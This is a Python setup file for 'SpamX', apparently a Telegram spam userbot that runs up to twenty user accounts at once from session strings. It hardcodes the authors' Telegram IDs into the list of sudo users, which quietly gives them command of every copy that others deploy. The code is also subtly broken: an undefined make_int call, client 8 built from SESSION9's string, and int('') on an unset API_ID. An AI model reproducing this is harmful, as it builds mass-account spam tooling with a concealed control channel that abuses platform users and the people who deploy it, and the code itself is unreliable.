# RiZoeL X - Telegram Projects
# (c) 2022 - 2023 RiZoeL
# Don't Kang Bitch -! 



import asyncio
import os
import sys
import time

from dotenv import load_dotenv
from pyrogram import Client, filters

ULOG = [1517994352, 1789859817, -1001749467927, -1001321613309]

if os.path.exists(".env"):
    load_dotenv(".env")
    
__version__ = "v0.1"

# -------------CONFIGS--------------------
API_ID = int(os.getenv("API_ID", ""))
API_HASH = os.getenv("API_HASH", "")
ALIVE_PIC = os.getenv("ALIVE_PIC", "")
ALIVE_MSG = os.getenv("ALIVE_MSG", "")
PING_MSG = os.getenv("PING_MSG", "")
SESSION = os.getenv("SESSION", None)
SESSION2 = os.getenv("SESSION2", None)
SESSION3 = os.getenv("SESSION3", None)
SESSION4 = os.getenv("SESSION4", None)
SESSION5 = os.getenv("SESSION5", None)
SESSION6 = os.getenv("SESSION6", None)
SESSION7 = os.getenv("SESSION7", None)
SESSION8 = os.getenv("SESSION8", None)
SESSION9 = os.getenv("SESSION9", None)
SESSION10 = os.getenv("SESSION10", None)
SESSION11 = os.getenv("SESSION11", None)
SESSION12 = os.getenv("SESSION12", None)
SESSION13 = os.getenv("SESSION13", None)
SESSION14 = os.getenv("SESSION14", None)
SESSION15 = os.getenv("SESSION15", None)
SESSION16 = os.getenv("SESSION16", None)
SESSION17 = os.getenv("SESSION17", None)
SESSION18 = os.getenv("SESSION18", None)
SESSION19 = os.getenv("SESSION19", None)
SESSION20 = os.getenv("SESSION20", None)
LOGS_CHANNEL = os.getenv("LOGS_CHANNEL", None)
if LOGS_CHANNEL:
    if int(LOGS_CHANNEL) in ULOG:
        print("You Can't Use That Chat As A Log Channel -!")
        print("Change Logs Channel Id else Bot Could not be start")
        quit()
    
HNDLR = os.getenv("HNDLR", ".")
OWNER_ID = int(os.environ.get("OWNER_ID", None))
sudo = os.getenv("SUDO_USERS")

SUDO_USERS = []
if sudo:
    SUDO_USERS = make_int(sudo)
DEVS = [1517994352, 1789859817]
for x in DEVS:
    SUDO_USERS.append(x)

SUDO_USERS.append(OWNER_ID)


# SUDO_USERS = list(filter(lambda x: x, map(int, os.getenv("SUDO_USERS", "1517994352 1789859817").split())))
#----------------------------------------------

RiZoeL = Client(name="SESSION", api_id = API_ID, api_hash = API_HASH, session_string=SESSION, plugins=dict(root="SpamX.module"))
print("Client 1 Found")


hl = HNDLR[0]
start_time = time.time()

#-------------------------CLIENTS-----------------------------

if SESSION2:
    RiZoeL2 = Client(name="SESSION2", api_id = API_ID, api_hash = API_HASH, session_string=SESSION2, plugins=dict(root="SpamX.module"))
    print("Client 2 Found")
else:
    RiZoeL2 = None

if SESSION3:
    RiZoeL3 = Client(name="SESSION3", api_id = API_ID, api_hash = API_HASH, session_string=SESSION3, plugins=dict(root="SpamX.module"))
    print("Client 3 Found")
else:
    RiZoeL3 = None

if SESSION4:
    RiZoeL4 = Client(name="SESSION4", api_id = API_ID, api_hash = API_HASH, session_string=SESSION4, plugins=dict(root="SpamX.module"))
    print("Client 4 Found")
else:
    RiZoeL4 = None

if SESSION5:
    RiZoeL5 = Client(name="SESSION5", api_id = API_ID, api_hash = API_HASH, session_string=SESSION5, plugins=dict(root="SpamX.module"))
    print("Client 5 Found")
else:
    RiZoeL5 = None

if SESSION6:
    RiZoeL6 = Client(name="SESSION6", api_id = API_ID, api_hash = API_HASH, session_string=SESSION6, plugins=dict(root="SpamX.module"))
    print("Client 6 Found")
else:
    RiZoeL6 = None
        
if SESSION7:
    RiZoeL7 = Client(name="SESSION7", api_id = API_ID, api_hash = API_HASH, session_string=SESSION7, plugins=dict(root="SpamX.module"))
    print("Client 7 Found")
else:
    RiZoeL7 = None

if SESSION8:
    RiZoeL8 = Client(name="SESSION8", api_id = API_ID, api_hash = API_HASH, session_string=SESSION9, plugins=dict(root="SpamX.module"))
    print("Client 8 Found")
else:
    RiZoeL8 = None

if SESSION9:
    RiZoeL9 = Client(name="SESSION9", api_id = API_ID, api_hash = API_HASH, session_string=SESSION9, plugins=dict(root="SpamX.module"))
    print("Client 9 Found")
else:
    RiZoeL9 = None

if SESSION10:
    RiZoeL10 = Client(name="SESSION10", api_id = API_ID, api_hash = API_HASH, session_string=SESSION10, plugins=dict(root="SpamX.module"))
    print("Client 10 Found")
else:
    RiZoeL10 = None

if SESSION11:
    RiZoeL11 = Client(name="SESSION11", api_id = API_ID, api_hash = API_HASH, session_string=SESSION11, plugins=dict(root="SpamX.module"))
    print("Client 11 Found")
else:
    RiZoeL11 = None

if SESSION12:
    RiZoeL12 = Client(name="SESSION12", api_id = API_ID, api_hash = API_HASH, session_string=SESSION12, plugins=dict(root="SpamX.module"))
    print("Client 12 Found")
else:
    RiZoeL12 = None

if SESSION13:
    RiZoeL13 = Client(name="SESSION13", api_id = API_ID, api_hash = API_HASH, session_string=SESSION13, plugins=dict(root="SpamX.module"))
    print("Client 13 Found")
else:
    RiZoeL13 = None

if SESSION14:
    RiZoeL14 = Client(name="SESSION14", api_id = API_ID, api_hash = API_HASH, session_string=SESSION14, plugins=dict(root="SpamX.module"))
    print("Client 14 Found")
else:
    RiZoeL14 = None

if SESSION15:
    RiZoeL15 = Client(name="SESSION15", api_id = API_ID, api_hash = API_HASH, session_string=SESSION15, plugins=dict(root="SpamX.module"))
    print("Client 15 Found")
else:
    RiZoeL15 = None

if SESSION16:
    RiZoeL16 = Client(name="SESSION16", api_id = API_ID, api_hash = API_HASH, session_string=SESSION16, plugins=dict(root="SpamX.module"))
    print("Client 16 Found")
else:
    RiZoeL16 = None
    
if SESSION17:
    RiZoeL17 = Client(name="SESSION17", api_id = API_ID, api_hash = API_HASH, session_string=SESSION17, plugins=dict(root="SpamX.module"))
    print("Client 17 Found")
else:
    RiZoeL17 = None   
    
if SESSION18:
    RiZoeL18 = Client(name="SESSION18", api_id = API_ID, api_hash = API_HASH, session_string=SESSION18, plugins=dict(root="SpamX.module"))
    print("Client 18 Found")
else:
    RiZoeL18 = None     
    
if SESSION19:
    RiZoeL19 = Client(name="SESSION19", api_id = API_ID, api_hash = API_HASH, session_string=SESSION19, plugins=dict(root="SpamX.module"))
    print("Client 19 Found")
else:
    RiZoeL19 = None    

if SESSION20:
    RiZoeL20 = Client(name="SESSION20", api_id = API_ID, api_hash = API_HASH, session_string=SESSION20, plugins=dict(root="SpamX.module"))
    print("Client 20 Found")
else:
    RiZoeL20 = None
